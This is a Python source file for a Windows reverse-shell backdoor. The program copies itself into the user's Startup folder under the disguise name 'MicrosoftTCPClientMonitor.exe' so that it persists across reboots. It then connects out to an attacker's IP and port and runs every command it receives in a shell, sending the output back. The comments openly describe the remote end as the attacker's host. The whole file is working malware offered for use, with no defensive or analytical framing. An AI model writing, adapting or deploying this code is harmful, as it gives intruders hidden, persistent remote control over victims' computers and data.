#adding of libraries
import os
import socket
import getpass
import subprocess

#defining of global variables
s = socket.socket()
#have to change
host = "192.168.1.75"
#have to change
port = 4444

#copeing of program to startup folder
username = str(getpass.getuser())
os.system(f'copy MicrosoftTCPClientMonitor.exe "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

#connecting to remote host (host of attacker)
s.connect((host, port))

#function for sending and receiving data
def socket_recive():
    try:
        #starting cycle for sending and receiving
        while True:
            #defining variable with received data. You can change maximum size
            data = s.recv(1024)

            #if command cd without arguments folder doesn't change
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))

            #If the string length is greater than zero the result of the command is sent to the attacker's host
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            #decrypting bytes
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8", errors='ignore')

            #sending of output
            s.send(str.encode(output_str + str(os.getcwd()) + "> "))
            print(output_str)
    #retry if doesn't work
    except:
        socket_recive()

#start of function
socket_recive()
